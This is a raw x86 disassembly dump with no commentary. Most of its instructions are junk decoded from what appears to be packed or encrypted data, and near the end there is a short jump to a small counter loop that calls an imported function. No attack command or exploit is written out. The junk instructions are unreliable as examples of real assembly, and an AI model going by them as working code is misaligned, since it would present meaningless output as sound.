  4057b1:	fidivr WORD PTR [ebx-0x25]
  4057b4:	jbe    0x405763
  4057b6:	xchg   DWORD PTR [edx],edx
  4057b8:	xlat   BYTE PTR ds:[ebx]
  4057b9:	adc    esi,DWORD PTR [ebp-0x79]
  4057bc:	mov    ecx,0x4ec203ba
  4057c1:	fmul   QWORD PTR [eax+eax*1]
  4057c4:	cdq    
  4057c5:	mov    al,0x4e
  4057c7:	xchg   DWORD PTR [eax],esi
  4057c9:	lea    eax,[esi+0x78206cac]
  4057cf:	inc    edx
  4057d0:	jle    0x4057e3
  4057d2:	pop    eax
  4057d3:	call   0xbe91:0x9be69a5a
  4057da:	aam    0x6b
  4057dc:	mov    al,ds:0x5109cc3a
  4057e1:	dec    edi
  4057e2:	push   esp
  4057e3:	jecxz  0x405859
  4057e5:	lods   eax,DWORD PTR ds:[esi]
  4057e6:	shl    DWORD PTR [ecx+0x67],1
  4057e9:	int    0xb9
  4057eb:	out    0x80,al
  4057ed:	xor    eax,0x8caf142b
  4057f2:	pop    ebx
  4057f3:	inc    ah
  4057f5:	xchg   esi,eax
  4057f6:	inc    edi
  4057f7:	test   DWORD PTR [ecx],edx
  4057f9:	mov    edx,0x7052b58b
  4057fe:	jns    0x40587e
  405800:	cld    
  405801:	dec    edx
  405802:	stos   DWORD PTR es:[edi],eax
  405803:	adc    al,0x43
  405805:	or     ebp,edi
  405807:	sub    DWORD PTR [eax+eax*8+0x5a005022],0x655a7efc
  405812:	ret    0xd13b
  405815:	xor    eax,0xffffffd9
  405818:	shl    BYTE PTR [ebp-0x1],1
  40581b:	je     0x405871
  40581d:	ins    DWORD PTR es:[edi],dx
  40581e:	push   0x1d
  405820:	out    0x59,al
  405822:	je     0x405833
  405824:	addr16 sahf 
  405826:	mov    ecx,0xf5920823
  40582b:	xor    al,0x46
  40582d:	sub    BYTE PTR [edx-0xa],al
  405830:	xchg   esp,eax
  405831:	nop
  405832:	inc    eax
  405833:	push   eax
  405834:	rsm    
  405836:	jbe    0x40589b
  405838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405839:	jb     0x4057bb
  40583b:	out    dx,al
  40583c:	dec    ebp
  40583d:	in     eax,0xdd
  40583f:	les    edx,FWORD PTR [ebp-0x74c17145]
  405845:	fadd   DWORD PTR [eax]
  405847:	movsx  eax,WORD PTR [eax+0x4d5c1d53]
  40584e:	sub    al,0x86
  405850:	push   ss
  405851:	pop    ebx
  405852:	cli    
  405853:	sub    eax,0x30bd7af7
  405858:	mov    ecx,0x5db104a9
  40585d:	pusha  
  40585e:	mov    dl,BYTE PTR [ecx-0x47]
  405861:	jne    0x405886
  405863:	inc    eax
  405864:	xchg   ebx,eax
  405865:	pop    ebp
  405866:	xlat   BYTE PTR ds:[ebx]
  405867:	int    0xb
  405869:	dec    ebx
  40586a:	icebp  
  40586b:	xlat   BYTE PTR ds:[ebx]
  40586c:	ins    BYTE PTR es:[edi],dx
  40586d:	sub    esi,ebp
  40586f:	outs   dx,BYTE PTR ds:[esi]
  405870:	push   ss
  405871:	je     0x4058e6
  405873:	daa    
  405874:	mov    edx,0x521b92bc
  405879:	xrelease mov BYTE PTR [esi-0xd],dl
  40587d:	adc    cl,BYTE PTR [edi+0x5a]
  405880:	xchg   esi,eax
  405881:	(bad)  
  405882:	leave  
  405883:	int    0x40
  405885:	fist   WORD PTR [ebx+0xb4b2125]
  40588b:	cmp    ebp,DWORD PTR [eax+0x3f]
  40588e:	mov    DWORD PTR [edx],edi
  405890:	jmp    0xcddf:0x45e34177
  405897:	mov    esi,0x4018ca4d
  40589c:	jl     0x40586c
  40589e:	mov    al,0x72
  4058a0:	rol    DWORD PTR [eax+0x16],0x3f
  4058a4:	int3   
  4058a5:	mov    ds:0xe1424730,al
  4058aa:	(bad)  
  4058ab:	outs   dx,BYTE PTR ds:[esi]
  4058ac:	mov    al,ds:0x53d8bd1a
  4058b1:	sbb    BYTE PTR [ebx+0x6af9123d],bl
  4058b7:	cli    
  4058b8:	loope  0x405895
  4058ba:	dec    edi
  4058bb:	xor    cl,BYTE PTR [edx-0x5c]
  4058be:	in     al,0x61
  4058c0:	pop    ss
  4058c1:	in     eax,dx
  4058c2:	ror    DWORD PTR [eax+0x641bfc65],0xea
  4058c9:	mov    bl,0x6f
  4058cb:	aaa    
  4058cc:	cli    
  4058cd:	inc    esi
  4058ce:	out    0x69,al
  4058d0:	in     al,dx
  4058d1:	mov    ds,WORD PTR [ecx-0x5869b35f]
  4058d7:	inc    ebx
  4058d8:	or     BYTE PTR [esi-0x2f234088],0x6c
  4058df:	pusha  
  4058e0:	fsubr  QWORD PTR [ecx-0x26]
  4058e3:	scas   al,BYTE PTR es:[edi]
  4058e4:	or     BYTE PTR [eax],ah
  4058e6:	xchg   DWORD PTR [ebx+0x47],edx
  4058e9:	cmp    DWORD PTR [ebx-0x7b],0x60
  4058ed:	rol    BYTE PTR [edx+0x6f8c09b8],1
  4058f3:	into   
  4058f4:	mov    esp,0x17ce101f
  4058f9:	jae    0x405880
  4058fb:	mov    ecx,0xf6b86633
  405900:	retf   0x89bb
  405903:	mov    WORD PTR [ebp+eiz*8+0x29],?
  405907:	lahf   
  405908:	shl    DWORD PTR [ebx],1
  40590a:	sahf   
  40590b:	xchg   esp,eax
  40590c:	jle    0x40596f
  40590e:	ror    ch,1
  405910:	fimul  DWORD PTR [edi+0x1c32d1ba]
  405916:	fwait
  405917:	dec    ebp
  405918:	stos   DWORD PTR es:[edi],eax
  405919:	push   edi
  40591a:	ja     0x4058dd
  40591c:	aad    0x2d
  40591e:	jge    0x405924
  405920:	xchg   esp,eax
  405921:	push   ebp
  405922:	inc    esi
  405923:	push   eax
  405924:	ins    DWORD PTR es:[edi],dx
  405925:	sub    dh,BYTE PTR [edx]
  405927:	nop
  405928:	jbe    0x4059a8
  40592a:	add    DWORD PTR [ebx+eax*1+0x5d],esp
  40592e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40592f:	aad    0xc2
  405931:	mov    eax,ds:0x886eadd8
  405936:	and    edi,DWORD PTR ds:[ecx+0x2e]
  40593a:	cld    
  40593b:	jb     0x4058fb
  40593d:	fbld   TBYTE PTR [ebx]
  40593f:	repnz sti 
  405941:	(bad)  
  405942:	call   0x4e04d794
  405947:	mov    ch,0xf8
  405949:	sbb    al,0xb8
  40594b:	iret   
  40594c:	jmp    0x6ad9:0xd9d5bb87
  405953:	daa    
  405954:	push   ds
  405955:	or     cl,BYTE PTR [edi-0x232171e8]
  40595b:	mov    ecx,0x20f9384b
  405960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405961:	add    eax,0x29bc36ef
  405966:	cdq    
  405967:	and    bl,BYTE PTR ds:0x28f44b9
  40596d:	sbb    ecx,esp
  40596f:	sar    DWORD PTR [ebp+ecx*2-0x4b483819],0x67
  405977:	inc    DWORD PTR [eax-0x16c2db9c]
  40597d:	sub    eax,0xff4020ed
  405982:	xor    ch,BYTE PTR [ebx-0x57]
  405985:	(bad)  
  405986:	(bad)  
  405988:	leave  
  405989:	push   0xd
  40598b:	ds pop esi
  40598d:	sub    DWORD PTR [edx+0x7d11f91d],esp
  405993:	inc    edi
  405994:	(bad)
  405998:	cmp    al,0x2
  40599a:	ja     0x405a15
  40599c:	ja     0x405a0a
  40599e:	xor    ecx,DWORD PTR [ebp+0x4bc949df]
  4059a4:	sub    DWORD PTR [ebp+0x10],edi
  4059a7:	fwait
  4059a8:	dec    esi
  4059a9:	pop    ecx
  4059aa:	pushf  
  4059ab:	add    al,0x7d
  4059ad:	scas   eax,DWORD PTR es:[edi]
  4059ae:	jnp    0x40597e
  4059b0:	dec    ebx
  4059b1:	sbb    al,0xa2
  4059b3:	cmp    eax,0xee24ac5e
  4059b8:	jmp    0x4059e8
  4059ba:	pop    ecx
  4059bb:	pop    ebp
  4059bc:	cmp    al,0xa1
  4059be:	pop    ebx
  4059bf:	jge    0x405a0a
  4059c1:	mov    esp,0x49f2c37b
  4059c6:	addr16 inc eax
  4059c8:	and    al,dl
  4059ca:	ffreep st(4)
  4059cc:	pop    ecx
  4059cd:	push   ebp
  4059ce:	int    0xb5
  4059d0:	cmp    BYTE PTR [edi+0x7d1f166e],ah
  4059d6:	imul   ebx,DWORD PTR [edx-0x59],0xffffffe0
  4059da:	mov    ah,0x1
  4059dc:	fldenv [edx-0x34395723]
  4059e2:	(bad)  
  4059e3:	jmp    0x6e3fd4f9
  4059e8:	not    BYTE PTR [esi+esi*2-0x2e]
  4059ec:	dec    edi
  4059ed:	sbb    edi,edx
  4059ef:	pop    edx
  4059f0:	adc    ecx,DWORD PTR [ebp+0x33ac3fb9]
  4059f6:	leave  
  4059f7:	mov    ah,0xcc
  4059f9:	jge    0x40598c
  4059fb:	jno    0x405a05
  4059fd:	(bad)  
  4059fe:	pushf  
  4059ff:	or     eax,0xe8cfaef0
  405a04:	jmp    0xe7490c45
  405a09:	push   ds
  405a0a:	sbb    ecx,DWORD PTR ds:0x3f624f55
  405a10:	mov    dh,0x90
  405a12:	xor    DWORD PTR [ebp+0x24],0x17
  405a16:	int    0xfd
  405a18:	cmp    BYTE PTR [ebp-0x36],bl
  405a1b:	mov    eax,ds:0xa095580d
  405a20:	inc    ecx
  405a21:	push   ecx
  405a22:	out    0xc4,eax
  405a24:	sbb    dh,BYTE PTR [esi+edx*8-0x6661fdfe]
  405a2b:	test   BYTE PTR [esi],bh
  405a2d:	pop    ds
  405a2e:	mov    eax,DWORD PTR [ebp-0x10]
  405a31:	dec    ebx
  405a32:	mov    DWORD PTR [ebp-0x24],eax
  405a35:	adc    eax,ecx
  405a37:	mov    eax,DWORD PTR [ebp-0x1c]
  405a3a:	mov    DWORD PTR [ebp-0x20],eax
  405a3d:	add    eax,eax
  405a3f:	mov    ebx,0xf89c853c
  405a44:	sbb    DWORD PTR ds:0x42a375,0x49a8
  405a4e:	mov    DWORD PTR [ebp-0x50],ebx
  405a51:	jmp    0x405f5c
  405a56:	retf   0xd1c9
  405a59:	rcl    cl,1
  405a5b:	ror    cl,1
  405a5d:	fsin   
  405a5f:	sbb    DWORD PTR [ecx],ebp
  405a61:	pop    es
  405a62:	and    BYTE PTR [esi],bl
  405a64:	lods   eax,DWORD PTR ds:[esi]
  405a65:	mov    ?,WORD PTR [ebx+eax*8+0x78]
  405a69:	js     0x405ad5
  405a6b:	jl     0x405ae5
  405a6d:	js     0x405a66
  405a6f:	imul   eax,DWORD PTR [ebp+ebp*8+0x1a628c9],0x3b
  405a77:	and    ebx,DWORD PTR [edx-0x3833d4cd]
  405a7d:	add    DWORD PTR [esi+0x6af3bcf0],0xffffff99
  405a84:	out    dx,al
  405a85:	popa   
  405a86:	jns    0x405aa9
  405a88:	pusha  
  405a89:	push   ss
  405a8a:	cld    
  405a8b:	mov    edx,0x9825817e
  405a90:	sbb    ebp,esi
  405a92:	or     al,0xa6
  405a94:	je     0x405a1a
  405a96:	(bad)  
  405a97:	fmul   st(5),st
  405a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a9a:	sub    bh,BYTE PTR [ecx]
  405a9c:	mov    ebp,0xec42b4c2
  405aa1:	ret    
  405aa2:	ins    DWORD PTR es:[edi],dx
  405aa3:	and    DWORD PTR [ebx+0x50eba553],0xffffffa7
  405aaa:	(bad)  
  405aab:	pop    ds
  405aac:	sbb    eax,0x5e7cad18
  405ab1:	ret    
  405ab2:	jge    0x405ac8
  405ab4:	inc    edx
  405ab5:	sbb    edi,DWORD PTR [ebp-0x1c]
  405ab8:	mov    al,ds:0x4b9c3d0c
  405abd:	mov    ebp,0xbb4b1b5f
  405ac2:	sbb    ebx,ecx
  405ac4:	int3   
  405ac5:	ins    DWORD PTR es:[edi],dx
  405ac6:	mov    sp,0xe927
  405aca:	dec    ebx
  405acb:	jecxz  0x405abf
  405acd:	adc    ah,bh
  405acf:	sub    DWORD PTR [esi],ebx
  405ad1:	imul   ebp,ecx,0x428e9c01
  405ad7:	jbe    0x405aa7
  405ad9:	add    DWORD PTR [ebx],0x63
  405adc:	or     DWORD PTR ds:0x7ca5b6dd,edi
  405ae2:	dec    ebp
  405ae3:	sub    eax,0xf9ce6a4b
  405ae8:	lods   eax,DWORD PTR ds:[esi]
  405ae9:	mov    esi,DWORD PTR [ebp+ebx*4+0x71ef063d]
  405af0:	inc    eax
  405af1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405af2:	pop    ecx
  405af3:	cmp    eax,0x3b954fdc
  405af8:	add    al,0x40
  405afa:	js     0x405b07
  405afc:	jo     0x405b2c
  405afe:	fcmovbe st,st(2)
  405b00:	pop    ebx
  405b01:	popa   
  405b02:	adc    al,0x73
  405b04:	sbb    edi,edx
  405b06:	call   ebx
  405b08:	mov    dh,0xe8
  405b0a:	mov    dl,0xf2
  405b0c:	in     eax,0x2a
  405b0e:	jo     0x405b0c
  405b10:	jb     0x405afa
  405b12:	and    ebx,ebx
  405b14:	push   esp
  405b15:	or     al,0x69
  405b17:	inc    eax
  405b18:	lods   eax,DWORD PTR ds:[esi]
  405b19:	fiadd  DWORD PTR [ebx+0x5f]
  405b1c:	je     0x405aa0
  405b1e:	adc    al,0x11
  405b20:	dec    ebx
  405b21:	xor    al,0x6c
  405b23:	imul   ecx,esp,0x4276c598
  405b29:	and    edi,DWORD PTR [edi]
  405b2b:	stos   DWORD PTR es:[edi],eax
  405b2c:	(bad)  
  405b2d:	(bad)  
  405b2e:	add    bp,WORD PTR [ebp+0x6d]
  405b32:	aam    0x87
  405b34:	mov    DWORD PTR [eax],0xa520ea7d
  405b3a:	dec    edx
  405b3b:	sub    DWORD PTR [ecx+ecx*1],0xbe6122ac
  405b42:	ret    0x3ca6
  405b45:	add    ebx,DWORD PTR [esi]
  405b47:	and    al,0xb5
  405b49:	push   0x61
  405b4b:	stc    
  405b4c:	cli    
  405b4d:	in     al,dx
  405b4e:	jecxz  0x405af1
  405b50:	xor    al,0x95
  405b52:	icebp  
  405b53:	cdq    
  405b54:	imul   eax,DWORD PTR [ecx-0x70],0xffffffb3
  405b58:	or     edi,edx
  405b5a:	cmp    eax,0x484a3c
  405b5f:	into   
  405b60:	psrlw  mm5,QWORD PTR [edx-0x262f7a81]
  405b67:	stos   DWORD PTR es:[edi],eax
  405b68:	and    eax,DWORD PTR [ebp+ebp*2-0x74240f08]
  405b6f:	inc    edx
  405b70:	loope  0x405b30
  405b72:	or     al,0x86
  405b74:	add    BYTE PTR [eax],bh
  405b76:	retf   0x240f
  405b79:	dec    eax
  405b7a:	jmp    0x405b35
  405b7c:	fs fsub st,st(5)
  405b7f:	xor    al,0x3
  405b81:	adc    dh,0x5
  405b84:	jne    0x405bff
  405b86:	dec    edx
  405b87:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b89:	cmp    eax,DWORD PTR [esi-0x1ba7e884]
  405b8f:	aad    0xf1
  405b91:	mov    cl,BYTE PTR [eax-0x35]
  405b94:	pushf  
  405b95:	(bad)
  405b98:	xchg   WORD PTR [esi+0x7f],cx
  405b9c:	call   0xc3ba:0x3b4f2982
  405ba3:	push   edx
  405ba4:	cmp    BYTE PTR [ebp-0x77aa2329],ch
  405baa:	in     al,dx
  405bab:	adc    eax,0x4a6aff5
  405bb0:	push   DWORD PTR [ecx+ebx*2]
  405bb3:	or     dl,dl
  405bb5:	int    0x51
  405bb7:	nop
  405bb8:	cmp    edi,edi
  405bba:	ret    
  405bbb:	inc    edi
  405bbc:	mov    WORD PTR ds:[esi],cs
  405bbf:	mov    edx,DWORD PTR [eax+0x21f24c8e]
  405bc5:	test   BYTE PTR [eax],al
  405bc7:	jp     0x405c15
  405bc9:	in     al,dx
  405bca:	push   ds
  405bcb:	(bad)  
  405bcc:	cli    
  405bcd:	jg     0x405be4
  405bcf:	mov    cl,0x2
  405bd1:	popa   
  405bd2:	xchg   esi,eax
  405bd3:	xchg   BYTE PTR [edx],ah
  405bd5:	mov    DWORD PTR [eax-0x63],esp
  405bd8:	(bad)  
  405bd9:	jne    0x405bf9
  405bdb:	repz popa 
  405bdd:	pushf  
  405bde:	js     0x405b67
  405be0:	repnz mov ecx,0xf792d012
  405be6:	and    eax,0x5f09589f
  405beb:	xchg   BYTE PTR [eax],dl
  405bed:	adc    DWORD PTR [esp],0xffffffc9
  405bf1:	sub    BYTE PTR [eax],ah
  405bf3:	xchg   BYTE PTR [esi],cl
  405bf5:	mov    ecx,0xb7db39f4
  405bfa:	mov    bl,0x6
  405bfc:	dec    eax
  405bfd:	out    dx,al
  405bfe:	lahf   
  405bff:	ss aam 0x78
  405c02:	into   
  405c03:	inc    esi
  405c04:	xchg   edi,eax
  405c05:	and    BYTE PTR [edi+0x3b2b0734],0x90
  405c0c:	std    
  405c0d:	jns    0x405bb1
  405c0f:	fistp  DWORD PTR [edi+edx*2-0x36]
  405c13:	sbb    BYTE PTR [esp+edi*8-0x35],dl
  405c17:	test   ecx,esi
  405c19:	jl     0x405c85
  405c1b:	sbb    dl,BYTE PTR [ebx+ebp*8+0x18]
  405c1f:	(bad)  
  405c21:	mov    al,0x64
  405c23:	cmp    al,0xa9
  405c25:	mov    ecx,0xe01f4a17
  405c2a:	and    DWORD PTR ss:[edx+0x3f],0xd55c2f48
  405c32:	fptan  
  405c34:	pop    ecx
  405c35:	mov    cl,BYTE PTR [esi+0x11f6e63d]
  405c3b:	mov    eax,0x6930664e
  405c40:	xor    DWORD PTR [ebx],esi
  405c42:	popa   
  405c43:	jecxz  0x405c60
  405c45:	faddp  st(1),st
  405c47:	sti    
  405c48:	jl     0x405c82
  405c4a:	cmp    eax,DWORD PTR [ecx]
  405c4c:	lds    esi,FWORD PTR [edi]
  405c4e:	cwde   
  405c4f:	or     BYTE PTR [ecx-0x22],ch
  405c52:	cmp    DWORD PTR ds:0x1fc3dfc2,0xa
  405c59:	test   eax,0x7b8b4efa
  405c5e:	sbb    DWORD PTR [ebp*4+0x24996fff],0xb23fefa
  405c69:	repnz scas eax,DWORD PTR es:[edi]
  405c6b:	test   al,0xc8
  405c6d:	mov    ch,0xd6
  405c6f:	ins    DWORD PTR es:[edi],dx
  405c70:	scas   al,BYTE PTR es:[edi]
  405c71:	ss sub esi,esi
  405c74:	lods   eax,DWORD PTR ds:[esi]
  405c75:	inc    ebp
  405c76:	out    0x19,al
  405c78:	scas   eax,DWORD PTR es:[edi]
  405c79:	sub    BYTE PTR [edi],ah
  405c7b:	and    edx,ebp
  405c7d:	stos   BYTE PTR es:[edi],al
  405c7e:	imul   ecx,DWORD PTR [eax-0x39],0x14
  405c82:	mov    bl,0x97
  405c84:	or     al,0xcf
  405c86:	add    cl,BYTE PTR [edx]
  405c88:	call   0x2f73:0xae8f490b
  405c8f:	lds    esp,FWORD PTR [ebp+0x15ea89b5]
  405c95:	xchg   ecx,eax
  405c96:	jle    0x405caf
  405c98:	sti    
  405c99:	and    ecx,ecx
  405c9b:	push   eax
  405c9c:	jle    0x405c53
  405c9e:	repnz or ch,BYTE PTR [ecx+0x51c16107]
  405ca5:	mov    dh,al
  405ca7:	sub    al,0xfa
  405ca9:	or     ecx,DWORD PTR [eax-0x77]
  405cac:	sar    esp,1
  405cae:	push   esi
  405caf:	and    eax,0x62ed2ad9
  405cb4:	(bad)  
  405cb5:	test   eax,0xcf980cce
  405cba:	pop    es
  405cbb:	test   ah,0x4
  405cbe:	and    DWORD PTR [ecx-0x1d32dcdc],edi
  405cc4:	jmp    0x1667:0x1d8bb33d
  405ccb:	cdq    
  405ccc:	xor    DWORD PTR [edx+ebx*4+0x3091a91c],edi
  405cd3:	mov    WORD PTR [ebx],ds
  405cd5:	sbb    BYTE PTR [eax+edi*4-0x5f84f442],ch
  405cdc:	mov    eax,ds:0xfb43f697
  405ce1:	stos   WORD PTR es:[edi],ax
  405ce3:	push   ebx
  405ce4:	sahf   
  405ce5:	call   0x9cf0:0x3ac50794
  405cec:	xor    al,0x21
  405cee:	fucomp st(0)
  405cf0:	ret    0xb166
  405cf3:	push   0x285221e2
  405cf8:	fcmovnb st,st(5)
  405cfa:	nop
  405cfb:	in     al,dx
  405cfc:	rcr    ah,1
  405cfe:	jae    0x405c91
  405d00:	add    BYTE PTR [edx],ch
  405d02:	loope  0x405cc3
  405d04:	sbb    eax,ecx
  405d06:	lahf   
  405d07:	sbb    BYTE PTR ds:0xffe8a0fd,bl
  405d0d:	test   DWORD PTR [ebx-0x2afb868d],esi
  405d13:	mov    bh,0xa3
  405d15:	call   0x9a8:0x3969be04
  405d1c:	ins    DWORD PTR es:[edi],dx
  405d1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d1e:	int3   
  405d1f:	mov    DWORD PTR [ebx+0x6c023d33],edi
  405d25:	outs   dx,DWORD PTR ds:[esi]
  405d26:	or     ah,dl
  405d28:	and    ebx,0xffffff83
  405d2b:	aas    
  405d2c:	dec    eax
  405d2d:	jae    0x405cb2
  405d2f:	xor    DWORD PTR [edi],eax
  405d31:	cmp    eax,ebx
  405d33:	fisub  DWORD PTR [ecx+0x56d06363]
  405d39:	pop    ss
  405d3a:	(bad)  
  405d3c:	and    al,0x44
  405d3e:	pusha  
  405d3f:	and    bh,bh
  405d41:	or     eax,DWORD PTR gs:[edx-0x47]
  405d45:	rol    BYTE PTR cs:[esp+edx*8+0x24],0x5a
  405d4b:	adc    DWORD PTR [ecx-0x26075710],ebp
  405d51:	in     eax,0xc0
  405d53:	(bad)  
  405d55:	lock fldenv [eax+0x20b126ca]
  405d5c:	inc    ebx
  405d5d:	adc    eax,0xc44a9687
  405d62:	push   esi
  405d63:	pop    esi
  405d64:	inc    ebx
  405d65:	mov    eax,ds:0x3e7e2090
  405d6a:	dec    edi
  405d6b:	dec    esi
  405d6c:	ds xchg ecx,eax
  405d6e:	pop    edx
  405d6f:	xchg   edx,eax
  405d70:	mov    ds:0xbdde774c,al
  405d75:	(bad)  
  405d77:	sub    eax,0x3ac96c69
  405d7c:	jmp    DWORD PTR [esp+esi*1]
  405d7f:	cmc    
  405d80:	sahf   
  405d81:	cmc    
  405d82:	ficom  WORD PTR [ebx+0x30c36cd6]
  405d88:	in     al,0xc4
  405d8a:	cli    
  405d8b:	and    al,0x87
  405d8d:	jp     0x405dbf
  405d8f:	test   BYTE PTR [eax-0x43ad8b19],cl
  405d95:	retf   0xf7ab
  405d98:	leave  
  405d99:	iret   
  405d9a:	and    al,0x8a
  405d9c:	imul   edi,DWORD PTR ds:0x21859ab4,0xffffffdd
  405da3:	scas   eax,DWORD PTR es:[edi]
  405da4:	and    esi,eax
  405da6:	sbb    edx,edi
  405da8:	pop    ecx
  405da9:	call   0x9a08:0x5f50f75b
  405db0:	adc    DWORD PTR [eax+0x10efa59c],0xef1f8ece
  405dba:	dec    edx
  405dbb:	pop    edx
  405dbc:	repz xchg esi,eax
  405dbe:	adc    BYTE PTR [edx-0x420c3ba2],bh
  405dc4:	cld    
  405dc5:	add    cl,BYTE PTR ds:0x67694640
  405dcb:	sbb    eax,0xf4dc87e0
  405dd0:	mov    ebx,0x2b60f2f7
  405dd5:	mov    edx,0xa3019acd
  405dda:	mov    bh,0xf2
  405ddc:	in     eax,0xd
  405dde:	jmp    0x405d67
  405de0:	pusha  
  405de1:	push   ds
  405de2:	or     al,0xed
  405de4:	or     BYTE PTR [edx-0x6f9621d9],al
  405dea:	xchg   DWORD PTR [ecx+ebx*4-0x3e],edi
  405dee:	pop    DWORD PTR [eax+eax*1]
  405df1:	dec    ebx
  405df2:	js     0x405e20
  405df4:	mov    esi,DWORD PTR [ebp+ebp*4-0x58477582]
  405dfb:	mov    ?,esp
  405dfd:	stos   DWORD PTR es:[edi],eax
  405dfe:	push   cs
  405dff:	loope  0x405e41
  405e01:	jae    0x405e1a
  405e03:	cli    
  405e04:	and    eax,0x287e82de
  405e09:	pop    ecx
  405e0a:	aaa    
  405e0b:	(bad)  
  405e0c:	ret    
  405e0d:	rcr    bl,0x90
  405e10:	mov    ch,0x7c
  405e12:	sar    ecx,0x85
  405e15:	and    eax,0x244c1023
  405e1a:	cdq    
  405e1b:	push   edx
  405e1c:	sbb    eax,0xd403ccc3
  405e21:	jb     0x405e50
  405e23:	mov    cl,0xb1
  405e25:	out    0xf2,eax
  405e27:	mov    ds,edx
  405e29:	mov    al,0x56
  405e2b:	mov    al,ds:0x608ca20
  405e30:	ja     0x405eae
  405e32:	loop   0x405e93
  405e34:	and    ch,BYTE PTR [ebp-0x2ed8f2a8]
  405e3a:	not    bh
  405e3c:	ins    DWORD PTR es:[edi],dx
  405e3d:	inc    esi
  405e3e:	pop    eax
  405e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e40:	out    0x3c,al
  405e42:	ss mov dl,BYTE PTR fs:[ebx+ecx*8+0x1c]
  405e48:	dec    ecx
  405e49:	pop    eax
  405e4a:	mov    bl,0x9e
  405e4c:	les    ecx,FWORD PTR [eax-0x55c9a0ee]
  405e52:	or     BYTE PTR [esi],dl
  405e54:	jne    0x405e50
  405e56:	arpl   WORD PTR [edi+0x381b70c4],bp
  405e5c:	ds push ebp
  405e5e:	mov    ebx,cs
  405e60:	daa    
  405e61:	xchg   ebx,eax
  405e62:	outs   dx,BYTE PTR ds:[esi]
  405e63:	and    al,0x89
  405e65:	retf   0x2b7d
  405e68:	mov    BYTE PTR [edi+ecx*8-0x751a8640],dh
  405e6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e70:	mov    cl,0xfc
  405e72:	inc    edi
  405e73:	push   ebx
  405e74:	xlat   BYTE PTR ds:[ebx]
  405e75:	xchg   ebp,eax
  405e76:	(bad)  
  405e77:	mov    BYTE PTR [esi+ebp*4-0x2f],0x21
  405e7c:	sub    esi,DWORD PTR [ebx+0x4a4a8fd7]
  405e82:	sub    ebp,DWORD PTR [edi-0x2b]
  405e85:	adc    eax,0x294a0d43
  405e8a:	sti    
  405e8b:	aaa    
  405e8c:	pop    ebp
  405e8d:	imul   ecx,DWORD PTR gs:[eax-0x31631b5c],0x28
  405e95:	repz mov esi,0xe1c02880
  405e9b:	popa   
  405e9c:	lds    ecx,FWORD PTR [edx-0x2f]
  405e9f:	xchg   DWORD PTR [esi+ebp*8+0x0],ebp
  405ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ea4:	xchg   edi,eax
  405ea5:	stos   DWORD PTR es:[edi],eax
  405ea6:	shr    DWORD PTR cs:[ebp-0x454a1932],cl
  405ead:	inc    ebx
  405eae:	mul    BYTE PTR [ebp+0x4e5f4ae1]
  405eb4:	pop    esp
  405eb5:	xor    DWORD PTR [ebp-0x4383dcfb],0x217d0b7e
  405ebf:	fwait
  405ec0:	loopne 0x405f05
  405ec2:	iret   
  405ec3:	add    al,0x17
  405ec5:	mov    cl,0x17
  405ec7:	(bad)  
  405ec8:	mov    ch,0x92
  405eca:	cmc    
  405ecb:	or     BYTE PTR [ebx-0x7e],cl
  405ece:	xchg   ecx,eax
  405ecf:	xchg   edx,eax
  405ed0:	jbe    0x405ef3
  405ed2:	cmp    edi,DWORD PTR [esi-0x2c]
  405ed5:	aaa    
  405ed6:	xor    al,0xca
  405ed8:	daa    
  405ed9:	int    0x86
  405edb:	add    esi,DWORD PTR [ecx]
  405edd:	shl    BYTE PTR [esi-0x666c654b],0x18
  405ee4:	retf   0x1377
  405ee7:	in     eax,0x2f
  405ee9:	jb     0x405eec
  405eeb:	sar    DWORD PTR [edi],0xee
  405eee:	dec    esp
  405eef:	mov    dl,BYTE PTR [edi-0x6777c9bf]
  405ef5:	mov    ebp,0x9b47eedf
  405efa:	mov    ds:0xe4c790ad,eax
  405eff:	pop    ebp
  405f00:	ficomp WORD PTR [esi+0x63047b1c]
  405f06:	jge    0x405e9a
  405f08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f09:	loope  0x405f2b
  405f0b:	pop    ebp
  405f0c:	push   ss
  405f0d:	outs   dx,DWORD PTR ds:[esi]
  405f0e:	(bad)  
  405f0f:	scas   eax,DWORD PTR es:[edi]
  405f10:	xor    ebx,DWORD PTR ds:0x8bc5d850
  405f16:	jb     0x405f07
  405f18:	add    bh,bh
  405f1a:	ret    0x7857
  405f1d:	out    0xe,al
  405f1f:	mov    gs,ebp
  405f21:	fisttp QWORD PTR [ecx+0x51]
  405f24:	jle    0x405eb5
  405f26:	shr    BYTE PTR [ebx+ebp*1-0x5e],1
  405f2a:	(bad)  
  405f2b:	pop    esp
  405f2c:	push   0x7cf6e5d7
  405f31:	fsubr  st(2),st
  405f33:	dec    esi
  405f34:	mov    bh,0x5f
  405f36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f37:	cmp    edi,esp
  405f39:	mov    eax,ds:0xd1e679b
  405f3e:	pop    eax
  405f3f:	rcl    DWORD PTR [edx-0x53adca50],0x1f
  405f46:	sahf   
  405f47:	or     bl,BYTE PTR ds:0x4d095cf6
  405f4d:	pop    ds
  405f4e:	cmp    BYTE PTR [ebp-0x2f],0xd
  405f52:	jmp    0xa73b0441
  405f57:	ror    DWORD PTR [ebp+0x7f],0xf5
  405f5b:	pop    ebx
  405f5c:	mov    eax,DWORD PTR [ebp-0x50]
  405f5f:	mov    DWORD PTR ds:0x42a371,0x15
  405f69:	cmp    DWORD PTR ds:0x42a371,0x0
  405f70:	je     0x4064b0
  405f76:	cmp    DWORD PTR ds:0x42a371,0x19
  405f7d:	jne    0x405f93
  405f83:	push   0x42a381
  405f88:	push   0x42a663
  405f8d:	call   DWORD PTR ds:0x4251d8
  405f93:	mov    ecx,DWORD PTR ds:0x42a371
  405f99:	dec    ecx
  405f9a:	mov    DWORD PTR ds:0x42a371,ecx
  405fa0:	jmp    0x405f69
  405fa5:	jmp    0x4064b0
